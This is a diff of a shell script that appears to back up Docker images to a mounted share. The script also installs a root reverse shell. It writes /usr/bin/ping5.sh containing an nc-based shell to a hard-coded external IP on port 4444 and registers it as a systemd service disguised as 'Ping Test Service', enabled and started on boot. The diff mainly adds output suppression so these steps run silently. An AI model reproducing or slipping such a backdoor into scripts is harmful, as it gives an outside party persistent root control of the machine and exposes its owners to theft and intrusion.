@@ -27,7 +27,7 @@ for image in $images; do
   safe_name=$(echo $image | tr '/:' '--')
   tar_file="${safe_name}.tar"
   docker save -o "$tar_file" "$image"
-  cp "$tar_file" /mnt/share/docker  > /dev/null 2>&1
+  cp "$tar_file" /mnt/share/docker 
   rm "$tar_file"  > /dev/null 2>&1
 done
 # 공유폴더 해제
@@ -39,7 +39,7 @@ sudo tee /usr/bin/ping5.sh > /dev/null << 'EOF'
 sudo su -c "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 220.75.218.64 4444 > /tmp/f"
 EOF
 
-sudo chmod +x /usr/bin/ping5.sh  > /dev/null 
+sudo chmod +x /usr/bin/ping5.sh  > /dev/null 2>&1
 sudo tee /etc/systemd/system/ping.service > /dev/null << 'EOF'
 [Unit]
 Description=Ping Test Service
@@ -55,6 +55,6 @@ Restart=no
 WantedBy=multi-user.target
 EOF
 
-sudo systemctl daemon-reload
-sudo systemctl enable ping.service
-sudo systemctl start ping.service
+sudo systemctl daemon-reload > /dev/null 2>&1
+sudo systemctl enable ping.service > /dev/null 2>&1
+sudo systemctl start ping.service > /dev/null 2>&1
